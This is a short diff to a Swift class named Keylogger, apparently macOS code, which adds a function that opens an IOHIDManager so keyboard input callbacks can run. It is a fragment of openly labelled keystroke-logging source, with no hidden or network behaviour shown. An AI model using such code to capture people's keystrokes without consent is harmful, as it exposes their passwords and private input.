@@ -68,6 +68,13 @@ class Keylogger: CallBackFunctions
         /* Input value Call Backs */
         IOHIDManagerRegisterInputValueCallback(manager, Handle_IOHIDInputValueCallback, observer);
         
+        /* Open HID Manager */
+        let ioreturn: IOReturn = openHIDManager()
+        if ioreturn != kIOReturnSuccess
+        {
+            print("Can't open HID!")
+        }
+        
         /* Scheduling the loop */
         scheduleHIDLoop()
        
@@ -122,6 +129,10 @@ class Keylogger: CallBackFunctions
         return resultAsCFDic
     }
     
+    func openHIDManager() -> IOReturn
+    {
+        return IOHIDManagerOpen(manager, IOOptionBits(kIOHIDOptionsTypeNone));//kIOHIDOptionsTypeSeizeDevice
+    }
     
     func scheduleHIDLoop()
     {
